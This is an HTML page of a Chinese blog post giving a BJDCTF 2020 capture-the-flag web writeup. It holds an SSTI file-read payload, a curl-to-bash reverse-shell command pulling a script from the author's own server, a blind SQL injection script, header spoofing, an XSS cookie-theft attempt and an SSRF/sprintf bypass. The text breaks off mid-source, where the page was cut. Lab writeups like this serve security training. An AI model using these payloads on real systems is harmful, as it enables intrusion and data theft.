@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>BJDCTF_writeup - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="BJDCTF_writeup | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2020/03/25/BJDCTF_writeup//images/bjdctf.jpg">
+<meta property="twitter:image" content="https://blog.play2win.top/2020/03/25/BJDCTF_writeup//images/bjdctf.jpg">
+
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="BJDCTF_writeup" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="BJDCTF_writeup" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-image">
+        <span  class="image is-7by1">
+            <img class="thumbnail" src="/images/bjdctf.jpg" alt="BJDCTF_writeup">
+        </span>
+    </div>
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-03-25T09:42:27.000Z">2020-03-25</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    22 分钟 读完 (大约 3320 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                BJDCTF_writeup
+            
+        </h1>
+        <div class="content">
+            <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h2><p>在注释里看就是SSTI。</p>
+<a id="more"></a>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-23 173053.png" alt></p>
+<p>不会SSTI，直接在网上找payload打下。</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">177</span>].__init__.__globals__.__builtins__[<span class="hljs-string">'open'</span>](<span class="hljs-string">'/flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h2><p>主页的黑页提示了是thinkphp5，又整出一个报错页面看到具体版本是5.0.23。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-23 174554.png" alt></p>
+<p>发现有REC漏洞，直接用payload打下。</p>
+<blockquote>
+<p><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" target="_blank" rel="noopener">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p>
+</blockquote>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-23 175128.png" alt></p>
+<h2 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h2><p>提示有源码泄露，下载下来用vim恢复。看到读文件的命令只过滤了cat。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 150828.png" alt></p>
+<p>当时做题的时候直接<code>less /flag</code>OOB(Out of Band)就输出flag了，写writeup复现时候看到这个。。。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 151337.png" alt></p>
+<p>只好老老实实的反弹shell，想着用base32或者hex编码一下反弹shell的命令，但又没base32又没python，只好作罢。起一个linux靶机，<code>python -m SimpleHTTPServer 8000</code>开个web服务，目录下放一句话bash反弹shell。用命令<code>curl http://174.1.92.51:8000/shell.txt | bash</code>来反弹。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 152416.png" alt></p>
+<h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>在robots.txt里看见了hint.txt，给出了sql语句。</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&apos;$_POST[&quot;username&quot;]&apos; and password=&apos;$_POST[&quot;password&quot;]&apos;;</span><br></pre></td></tr></table></figure>
+<p>众所周知，ctf比赛里叫easy的题目都不easy，不出所料肯定有过滤。先把关键字扔进burpsuite里跑一跑。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 154527.png" alt></p>
+<p>过滤了关键字若干，其中单引号也过滤了，但没过滤反斜杠。用剩下来的关键字构造一个变种万能密码。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 155513.png" alt></p>
+<p>登录成功只出来一句话，并没有flag，因为前面看到过滤了<code>union</code>、<code>select</code>等关键字，考虑不能跨表查询了，flag可能就是登录密码。下面直接上盲注脚本。</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="hljs-comment"># _*_  coding:utf-8 _*_</span></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> urllib</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line">start_time = time.time()</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">words_len</span><span class="hljs-params">(url)</span>:</span></span><br><span class="line">    values=&#123;&#125;</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):</span><br><span class="line">        data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'p3rh4p\\'</span>,<span class="hljs-string">'password'</span>:<span class="hljs-string">'||length(password)&gt;%s#'</span> %i&#125;</span><br><span class="line">        geturl = url</span><br><span class="line">        response = requests.post(geturl,data)</span><br><span class="line">        <span class="hljs-keyword">if</span> response.content.find(<span class="hljs-string">'You konw'</span>)&gt;<span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">words</span><span class="hljs-params">(url)</span>:</span></span><br><span class="line">    payloads = <span class="hljs-string">'!"#$%&amp;\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~'</span></span><br><span class="line">    words= <span class="hljs-string">''</span></span><br><span class="line">    aa = words_len(url)</span><br><span class="line">    <span class="hljs-keyword">print</span> aa</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, aa+<span class="hljs-number">1</span>):</span><br><span class="line">        <span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> payloads:</span><br><span class="line">            data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'p3rh4p\\'</span>,<span class="hljs-string">'password'</span>:<span class="hljs-string">'||ascii(substring(password,%s,1))&gt;%s #'</span> %(i,ord(payload))&#125;</span><br><span class="line">            geturl = url</span><br><span class="line">            response = requests.post(geturl,data)</span><br><span class="line">            <span class="hljs-keyword">if</span> response.content.find(<span class="hljs-string">'You konw'</span>)&gt;<span class="hljs-number">0</span>:</span><br><span class="line">                words += payload</span><br><span class="line">                <span class="hljs-keyword">print</span> words</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">    <span class="hljs-keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    url=<span class="hljs-string">'http://827d094a-2833-4bfb-93a2-fb30e06a04f5.node3.buuoj.cn/check.php'</span></span><br><span class="line">    result=words(url)</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">"The current database:"</span>+result</span><br></pre></td></tr></table></figure>
+<p>跑出来的是密码，用密码登录获得flag。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 161244.png" style="zoom:80%;"></p>
+<h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>卡在http代理那一步，Google找了很久都没找到是什么头。。</p>
+<figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/L0g1n.php</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: node3.buuoj.cn:26931</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Commodore 64; Commodo 64; Commodo 64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Referer</span>: gem-love.com</span><br><span class="line"><span class="hljs-attribute">Sender</span>: root@gem-love.com</span><br><span class="line"><span class="hljs-attribute">From</span>: root@gem-love.com</span><br><span class="line"><span class="hljs-attribute">To</span>: root@gem-love.com</span><br><span class="line"><span class="hljs-attribute">Return-Path</span>: root@gem-love.com</span><br><span class="line"><span class="hljs-attribute">Downgraded-From</span>: root@gem-love.com</span><br><span class="line"><span class="hljs-attribute">Proxy</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">Proxy-Connection</span>: keep-alive</span><br><span class="line"><span class="hljs-attribute">Proxy-Connection</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">Proxy-Authenticate</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">Proxy-Authorization</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">Forwarded</span>: for=203.107.43.165;proto=http;by=203.107.43.165</span><br><span class="line"><span class="hljs-attribute">X-Forwarded-Host</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">Http-Proxy</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">X-Forwarded-Proto</span>: http</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: _ga=GA1.2.580799202.1584770711; _gid=GA1.2.332844867.1584770711; PHPSESSID=rtmk7m1cg7q3jne0ir65hsnva0; time=9584803982; __vgl=1</span><br><span class="line"><span class="hljs-attribute">X-Forwarded-For</span>: 203.107.43.165, 203.107.43.165, 203.107.43.165, 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">Client-IP</span>: 127.0.0.1</span><br><span class="line"><span class="hljs-attribute">X-Http-Forwarded-For</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">X-Requested-With</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">X-Remote-IP</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">X-Originating-IP</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">X-Remote-Addr</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">WL-Proxy-Client-IP</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">Remote-Addr</span>: 203.107.43.165</span><br><span class="line"><span class="hljs-attribute">DNT</span>: 1</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>最后看别人writeup是<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Via" target="_blank" rel="noopener">Via</a></p>
+</blockquote>
+<h2 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h2><p>这题没意思，搞得花里胡哨的，结果就在cookie里放个base64的时间，把时间改成负的就出来个av号，去批站相关视频下找flag。。就不放过程了</p>
+<h2 id="xss之光"><a href="#xss之光" class="headerlink" title="xss之光"></a>xss之光</h2><p>扫目录发现了.git目录（扫的时候要线程要调小一点，不然会被平台ban掉）。githack类工具推荐用<a href="https://github.com/gakki429/Git_Extract" target="_blank" rel="noopener">Git_Extract</a>，其他工具扫不出来的，用这个都能扫到，甚至历史版本也能扫出来。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 170433.png" alt></p>
+<p>序列化xss的payload就能搞个反射型xss，猜测后端有个bot能被你打cookie。</p>
+<p>于是在xss平台准备链接，插进去准备打cookie，日后发现打了个寂寞，只打到了自己的cookie，但是在自己的cookie里发现了flag，真是神奇。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 171915.png" alt></p>
+<h2 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h2><p>这题在比赛的时候没做出来，结束后试着复现下。</p>
+<p>在主页的Responce里有个hint：home.php，明显是php伪协议的任意文件读取。</p>
+<p><img src="/2020/03/25/BJDCTF_writeup/批注 2020-03-24 232023.png" alt></p>
+<p>读下来home.php和system.php的源码。</p>
+<p>home.php里没什么东西，就只能读这两个源码。</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="hljs-string">"y1ng"</span>, sha1(md5(<span class="hljs-string">'y1ng'</span>)), time() + <span class="hljs-number">3600</span>);</span><br><span class="line">setcookie(<span class="hljs-string">'your_ip_address'</span>, md5($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]), time()+<span class="hljs-number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'file'</span>]))&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/\^|\~|&amp;|\|/"</span>, $_GET[<span class="hljs-string">'file'</span>])) &#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"forbidden"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/.?f.?l.?a.?g.?/i"</span>, $_GET[<span class="hljs-string">'file'</span>]))&#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/.?a.?d.?m.?i.?n.?/i"</span>, $_GET[<span class="hljs-string">'file'</span>]))&#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"You! are! not! my! admin!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/^home$/i"</span>, $_GET[<span class="hljs-string">'file'</span>]))&#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"禁止套娃"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">else</span>&#123;</span><br><span class="line">        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/home$/i"</span>, $_GET[<span class="hljs-string">'file'</span>]) <span class="hljs-keyword">or</span> preg_match(<span class="hljs-string">"/system$/i"</span>, $_GET[<span class="hljs-string">'file'</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="hljs-string">'file'</span>].<span class="hljs-string">".php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="hljs-string">'file'</span>].<span class="hljs-string">".fxxkyou!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">"现在访问的是 "</span>.$file . <span class="hljs-string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="hljs-keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;location.href='./home.php?file=system'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>home.php里有个文件读取，但限死了只能读127.0.0.1的文件，干脆ssrf访问下admin.php</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'y1ng'</span>]) || $_COOKIE[<span class="hljs-string">'y1ng'</span>] !== sha1(md5(<span class="hljs-string">'y1ng'</span>)))&#123;</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"</span>;</span><br><span class="line">    header(<span class="hljs-string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    <span class="hljs-keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str2 = <span class="hljs-string">'       Error:  url invalid&lt;br&gt;~$ '</span>;</span><br><span class="line">$str3 = <span class="hljs-string">'       Error:  damn hacker!&lt;br&gt;~$ '</span>;</span><br><span class="line">$str4 = <span class="hljs-string">'       Error:  request method error&lt;br&gt;~$ '</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filter1 = <span class="hljs-string">'/^http:\/\/127\.0\.0\.1\//i'</span>;</span><br><span class="line">$filter2 = <span class="hljs-string">'/.?f.?l.?a.?g.?/i'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'q1'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'q2'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'q3'</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="hljs-string">'q2'</span>].<span class="hljs-string">".y1ng.txt"</span>;</span><br><span class="line">    $method = $_POST[<span class="hljs-string">'q3'</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="hljs-string">"~$ python fuck.py -u \""</span>.$url .<span class="hljs-string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="hljs-string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">        <span class="hljs-keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="hljs-keyword">false</span>);</span><br><span class="line">    <span class="hljs-keyword">print</span>(sprintf(<span class="hljs-string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>post一下<code>q1=1&amp;q2=http://127.0.0.1/admin.php?&amp;q3=GET</code>发现不行，去群里偷看下师傅们的聊天记录，发现还有个格式字符串漏洞Orz。用<code>q1=1&amp;q2=http://127.0.0.1/admin.php?&amp;q3=GET%1$s</code>在post一下，处出来一串admin.php的源码。</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="hljs-string">'f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;'</span>; <span class="hljs-comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">aesEn</span><span class="hljs-params">($data, $key)</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    $method = <span class="hljs-string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>],<span class="hljs-keyword">true</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Check</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_COOKIE[<span class="hljs-string">'your_ip_address'</span>]) &amp;&amp; $_COOKIE[<span class="hljs-string">'your_ip_address'</span>] === md5($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]) &amp;&amp; $_COOKIE[<span class="hljs-string">'y1ng'</span>] === sha1(md5(<span class="hljs-string">'y1ng'</span>)))</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> ( $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>] == <span class="hljs-string">"127.0.0.1"</span> ) &#123;</span><br><span class="line">    highlight_file(<span 